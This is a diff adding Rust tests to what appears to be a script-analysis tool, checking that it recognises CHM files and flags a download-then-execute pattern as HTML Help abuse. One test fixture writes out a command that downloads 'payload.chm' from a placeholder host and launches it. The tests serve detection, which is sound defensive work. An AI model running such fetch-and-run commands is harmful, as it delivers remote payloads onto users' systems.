@@ -475,6 +475,10 @@ mod interp_tests {
             Some("hta")
         );
         assert_eq!(
+            crate::interp::script_host_extension(r#"C:\Temp\Foo.ChM"#),
+            Some("chm")
+        );
+        assert_eq!(
             crate::interp::script_host_extension(r#"C:\Temp\Foo.Js."#),
             Some("js")
         );
@@ -1309,6 +1313,32 @@ payload.js"#;
                 )
             }),
             "implicit script execution did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn implicit_chm_execution_resolves_prior_download_source_url() {
+        let script = br#"curl -o payload.chm https://implicit-chm-source.example/payload.chm
+start payload.chm"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "payload.chm"
+                            && url == "https://implicit-chm-source.example/payload.chm"
+                )
+            }),
+            "implicit CHM execution did not resolve prior download source: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "hh" && cmd == "payload.chm")
+            ),
+            "implicit CHM execution was not marked as HTML Help: {:?}",
             report.traits
         );
     }
